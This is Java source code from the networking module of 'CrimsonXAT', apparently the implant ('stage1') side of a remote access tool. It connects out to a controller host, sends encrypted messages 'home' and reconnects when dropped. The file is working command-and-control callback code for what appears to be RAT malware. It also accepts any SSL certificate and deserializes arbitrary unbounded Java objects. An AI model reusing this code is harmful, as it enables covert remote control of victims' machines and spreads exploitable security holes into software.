/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage1.network;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.serialization.ClassResolvers;
import io.netty.handler.codec.serialization.ObjectDecoder;
import io.netty.handler.codec.serialization.ObjectEncoder;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;

import java.io.Serializable;
import java.net.InetSocketAddress;

import javax.net.ssl.SSLException;

import subterranean.crimson.permajar.stage1.Stage1;
import subterranean.crimson.permajar.stage2.Stage2;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Cryptography;
import subterranean.crimson.universal.Environment;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.ObjectTransfer;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.enumerations.EncType;

public enum Communications {

	;

	private static SslContext sslCtx = null;
	private static Handler handler;

	private static Channel c;

	public static synchronized boolean connect(final String HOST, final int PORT, final boolean SSL) {
		if (SSL) {
			Logger.add("Making SSL Connection attempt");
		} else {
			Logger.add("Making Connection attempt");
		}

		handler = new Handler();

		if (SSL) {
			try {
				sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);
			} catch (SSLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} else {
			sslCtx = null;
		}

		EventLoopGroup group = new NioEventLoopGroup();

		Bootstrap b = new Bootstrap();
		b.option(ChannelOption.CONNECT_TIMEOUT_MILLIS, Environment.reportTimeout);
		b.group(group).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {
			@Override
			public void initChannel(SocketChannel ch) {

				if (sslCtx != null) {
					ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));
				}
				ch.pipeline().addLast(new ObjectEncoder(), new ObjectDecoder(Integer.MAX_VALUE, ClassResolvers.cacheDisabled(null)), handler);

			}
		});

		ChannelFuture future = b.connect(new InetSocketAddress(HOST, PORT));
		if (!future.awaitUninterruptibly().isSuccess()) {
			group.shutdownGracefully();
			return false;
		}

		c = future.channel();

		try {
			Thread.sleep(500);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		return c.isWritable();
	}

	public static void sendHome(Message m) {

		// encode the aux if needed
		if (Stage1.options.encryptionType != EncType.None) {
			for (int i = 0; i < m.auxObject.length; i++) {
				m.auxObject[i] = Cryptography.encrypt(ObjectTransfer.toString((Serializable) m.auxObject[i], false), Stage1.options.encryptionType, Stage1.options.key);

			}
		}
		if (false) {//for now
			Message mm = new Message(m.getStreamID(), BMN.PROXY_message);

			Object[] o = { Stage2.getSettings().clientID, 0, m };
			mm.auxObject = o;
			handler.send(mm);
		} else {
			handler.send(m);
		}

	}

	public static boolean connected() {
		return (c == null) ? false : c.isWritable();
	}

	public static void disconnect() {
		c.disconnect();

		Stage1.connectionRoutine();
	}
}
